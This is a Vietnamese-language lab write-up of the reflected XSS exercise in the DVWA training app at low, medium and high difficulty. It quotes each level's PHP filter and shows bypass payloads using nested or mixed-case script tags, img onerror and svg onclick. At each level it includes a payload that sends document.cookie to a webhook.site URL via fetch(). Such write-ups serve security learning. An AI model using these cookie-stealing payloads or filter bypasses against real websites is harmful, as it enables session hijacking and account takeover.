# Reflected Cross Site Scripting (XSS) - DVWA

Mức độ: **LOW**, **MEDIUM**, **HIGH**

---

## 🔹 LEVEL: LOW

### 📌 Description:
Giao diện có một trường input `name`, khi nhập và submit thì web sẽ **hiển thị lại kết quả ngay bên dưới**.
<img width="601" height="188" alt="image" src="https://github.com/user-attachments/assets/ab4d9a9b-e3a3-4ec6-a5e9-63be4a0fbf99" />

---

### 🎯 Goals:
Khiến server thực thi đoạn mã JavaScript (XSS).

---

### 🔍 Phân tích:

- Giá trị `name` **không được lọc** gì cả.
- Tham số được **gắn thẳng vào URL và render ra HTML**.

→ Dễ dàng chèn bất kỳ đoạn JS nào vào.

---

### 🧪 Khai thác:

- Payload đơn giản:
```html
<script>alert(document.cookie)</script>
```

<img width="600" height="232" alt="image" src="https://github.com/user-attachments/assets/0757a153-cbee-419c-853a-ec8d6f40183d" />

- Payload gửi cookie về máy chủ của attacker:
```html
<script>
fetch("https://webhook.site/56199264-b66e-4211-a5f3-c02172bceb0a?cookie=" + document.cookie)
</script>
```

<img width="604" height="217" alt="image" src="https://github.com/user-attachments/assets/235046ae-acc1-4f44-9ce0-3a7d5bf8488c" />

> 📝 *Webhook.site tạo server tạm để nhận cookie – có thể thay bằng simple HTTP server từ Kali Linux.*

---

## 🔸 LEVEL: MEDIUM

### 🔍 Phân tích:

Dữ liệu người dùng được xử lý bằng:

```php
$name = str_replace('<script>', '', $_GET['name']);
```

→ Nếu chuỗi `<script>` xuất hiện thì bị thay bằng rỗng → chặn XSS.

---

### 💡 Bypass kỹ thuật:

- Trình duyệt hiện đại vẫn hiểu `<script>` viết sai kiểu:
  - `<ScRipT>`, `<scr<script>ipt>`
- Dùng thẻ khác thay `<script>` nhưng vẫn chạy được JS:
  - `<img src=x onerror=...>`
  - `<svg onclick=...>`

---

### 🧪 Thực hành:

Một số payload:

```html
<scr<script>ipt>
<ScRiPt>
<img src=x onerror=alert(1)>
<svg onclick=alert(1)>
```
<img width="604" height="191" alt="image" src="https://github.com/user-attachments/assets/57176b6c-69ed-4ac0-8d63-ff055f3798ed" />

Payload gửi cookie:

```html
<img 
src=x 
onerror=fetch("https://webhook.site/56199264-b66e-4211-a5f3-c02172bceb0a?cookie=" + document.cookie)>
```
<img width="610" height="244" alt="image" src="https://github.com/user-attachments/assets/dfd77422-2888-47ff-8d6d-fb1bfc1af90f" />

→ Gửi cookie sang máy chủ khác thành công.

---

## 🔺 LEVEL: HIGH

### 🔍 Phân tích:

Dữ liệu được lọc bằng regex:

```php
$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name);
```

→ Hàm này chặn mọi biến thể của `<script>`.

---

### 💡 Kỹ thuật bypass:

Không dùng `<script>`, mà dùng thẻ HTML khác để thực thi JavaScript:

- `<img src=x onerror=alert(document.cookie)>`
- `<svg onclick=...>`

---

### 🧪 Thực hành:

Payload gửi cookie:

```html
<svg 
onclick=fetch("https://webhook.site/56199264-b66e-4211-a5f3-c02172bceb0a?cookie=" + document.cookie)>
```

<img width="605" height="359" alt="image" src="https://github.com/user-attachments/assets/87abf951-b730-4b0f-9bdc-c791e6f4e2bc" />

→ Gửi cookie sang máy chủ khác thành công.

> 📝 *P/S: Level HIGH không hề khó hơn level MEDIUM – chỉ cần tư duy bypass linh hoạt!*
